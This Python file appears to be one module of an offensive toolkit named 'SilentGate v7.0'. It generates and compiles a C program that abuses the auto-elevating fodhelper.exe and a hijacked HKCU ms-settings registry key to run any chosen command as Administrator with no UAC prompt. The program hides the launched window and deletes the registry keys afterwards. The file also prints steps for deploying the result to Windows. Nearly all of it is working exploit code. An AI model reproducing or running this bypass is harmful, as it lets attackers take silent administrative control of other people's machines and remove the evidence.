"""
SilentGate v7.0 - UAC Bypass via fodhelper.exe
INPUT  : command to execute elevated
OUTPUT : command runs as Administrator without UAC prompt

Technique:
  fodhelper.exe has autoElevate=true in its manifest
  It reads HKCU\Software\Classes\ms-settings\shell\open\command
  We write our command there before launching fodhelper
  fodhelper auto-elevates and executes our command
  No UAC prompt appears

MITRE: T1548.002 - Abuse Elevation Control Mechanism: Bypass UAC
"""

import os
import subprocess


def generate_uac_bypass_c(command):
    """Generate C UAC bypass via fodhelper."""
    return f"""
#include <windows.h>
#include <stdio.h>

int main() {{
    const char* cmd = "{command}";
    const char* reg_path = "Software\\\\Classes\\\\ms-settings\\\\shell\\\\open\\\\command";
    const char* delegate = "Software\\\\Classes\\\\ms-settings\\\\shell\\\\open\\\\command";

    /* Write command to HKCU registry */
    HKEY hKey;
    RegCreateKeyExA(HKEY_CURRENT_USER, reg_path,
        0, NULL, 0, KEY_WRITE, NULL, &hKey, NULL);

    RegSetValueExA(hKey, NULL, 0, REG_SZ,
        (BYTE*)cmd, (DWORD)strlen(cmd)+1);

    /* Set DelegateExecute to empty string */
    RegSetValueExA(hKey, "DelegateExecute", 0, REG_SZ,
        (BYTE*)"", 1);

    RegCloseKey(hKey);

    /* Launch fodhelper - auto-elevates and runs our command */
    STARTUPINFOA si = {{sizeof(si)}};
    PROCESS_INFORMATION pi = {{0}};
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    CreateProcessA(
        "C:\\\\Windows\\\\System32\\\\fodhelper.exe",
        NULL, NULL, NULL, FALSE,
        CREATE_NO_WINDOW, NULL, NULL, &si, &pi
    );

    /* Wait for fodhelper to complete */
    WaitForSingleObject(pi.hProcess, 3000);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    /* Cleanup registry */
    RegDeleteKeyA(HKEY_CURRENT_USER,
        "Software\\\\Classes\\\\ms-settings\\\\shell\\\\open\\\\command");
    RegDeleteKeyA(HKEY_CURRENT_USER,
        "Software\\\\Classes\\\\ms-settings\\\\shell\\\\open");
    RegDeleteKeyA(HKEY_CURRENT_USER,
        "Software\\\\Classes\\\\ms-settings\\\\shell");
    RegDeleteKeyA(HKEY_CURRENT_USER,
        "Software\\\\Classes\\\\ms-settings");

    return 0;
}}
"""


def generate(command, output_dir="output/v7"):
    os.makedirs(output_dir, exist_ok=True)

    c_src = generate_uac_bypass_c(command)
    src_path = os.path.join(output_dir, "uac_bypass.c")
    exe_path = os.path.join(output_dir, "uac_bypass.exe")

    with open(src_path, "w") as f:
        f.write(c_src)

    r = subprocess.run(
        ["x86_64-w64-mingw32-gcc", src_path, "-o", exe_path,
         "-ladvapi32", "-O2", "-mwindows"],
        capture_output=True, text=True
    )

    success = r.returncode == 0
    if not success:
        print(f"[UAC] Compile error: {r.stderr}")
    else:
        print(f"[UAC] Compiled: {exe_path}")
        print(f"[UAC] Command : {command}")
        print(f"[UAC] Technique: fodhelper.exe autoElevate")
        print(f"[UAC] MITRE   : T1548.002")

    return success, exe_path


if __name__ == "__main__":
    # Test - open cmd.exe as Administrator without UAC
    success, exe = generate("cmd.exe /c whoami > C:\\ProgramData\\uac_test.txt")
    print(f"[UAC] Success: {success}")
    if success:
        print("[UAC] Deploy to Windows and run as standard user")
        print("[UAC] No UAC prompt will appear")
        print("[UAC] Check C:\\ProgramData\\uac_test.txt for result")
